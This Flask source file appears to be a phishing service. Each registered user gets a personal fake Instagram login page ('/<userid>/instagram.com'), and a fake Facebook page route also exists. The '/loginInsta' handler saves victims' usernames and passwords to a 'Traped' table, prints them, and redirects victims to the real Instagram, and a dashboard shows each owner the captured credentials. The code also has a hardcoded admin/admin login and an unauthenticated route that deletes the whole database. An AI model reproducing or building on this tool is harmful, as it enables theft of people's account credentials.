from flask import Flask,render_template,request,redirect,session
import DBHelper as dbh

app = Flask(__name__)

app.secret_key="myNameIsHeera"



#completed
@app.route("/")
def home():
    if 'user' in session:
        return render_template("home.html",uid=session['user'],isLogged=True)
    return render_template("home.html")




#completed
@app.route("/register",methods=['POST','GET'])
def register():
    if request.method=='POST':
        uid=request.form.get("username")
        
        if not dbh.checkIfUserExists(uid):
            email=request.form.get("email")
            pas=request.form.get("psw")
            print(uid,email,pas)
            dbh.insertIntoUser(uid,email,pas)
            return redirect("login")
        else:
            return render_template("register.html",userAlreadyExists=True)
        
    else:
        return render_template("register.html")




#completed
@app.route("/login",methods=['POST','GET'])
def login():
    if request.method=='POST':
        username=request.form.get('username')
        password=request.form.get('password')
        #for ADMIN
        if username=='admin' and password=='admin':
            session['admin']="admin"
            print(username,"logged in admin")
            return redirect('/admin')
        elif dbh.checkUserCredential(username,password):
            session['user']=username
            print(username,"logged in")
            return redirect('/')
        
        else:
            return render_template("login.html",wrongDetail=True)
    return render_template("login.html")




#completed
@app.route('/logout')
def logout():
    if 'user' in session:
         session.pop('user')
    if 'admin' in session:
        session.pop('admin')
    return redirect('/')




#Completed
@app.route("/apps")
def apps():
    if 'user' in session:
        return render_template("/apps.html",isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)




#completed
@app.route('/dashboard')
def dashboard():
    if 'user' in session :
        return render_template("dashboard.html",data=dbh.getTrapedDataForOwner(session['user']),isLogged=True,uid=session['user'])
    return render_template("login.html",isLogged=False)



#completed
@app.errorhandler(404)
def page_not_found(error):
    return render_template('page_not_found.html'), 404




#............INSTAGRAM..........

#for looking demo
@app.route("/instagram.com")
def insta():
    return render_template("/apps/insta.html")

#completed
@app.route("/<userid>/instagram.com")
def InstaPhishingPage(userid):
    if dbh.checkIfUserExists(userid):
        return render_template("apps/insta.html",uid=userid)
    return render_template('page_not_found.html')


#completed
@app.route("/loginInsta",methods=['POST'])
def loginInsta():
    owner=request.form.get('owner')
    if owner=="":
        pass
    else:
        site=request.form.get('app')
        uid=request.form.get('uid')
        pas=request.form.get('pas')
        dbh.insertIntoTraped(owner,site,uid,pas)
        print(owner,site,uid,pas)
    return redirect("https://instagram.com")

#..........INSTAGRAM END..........








#........ADMIN PAGE............
@app.route("/admin")
def admin():
     if 'admin' in session:
        return render_template("ADMIN.html",allData=dbh,uid=session['admin'])
     return render_template("login.html",isLogged=False)







@app.route("/facebook.com")
def facebook():
    return render_template("/apps/facebook.html")



#for admin
@app.route("/delete")
def deleteDATABASE():
    dbh.deleteAll()
    return "deleted"
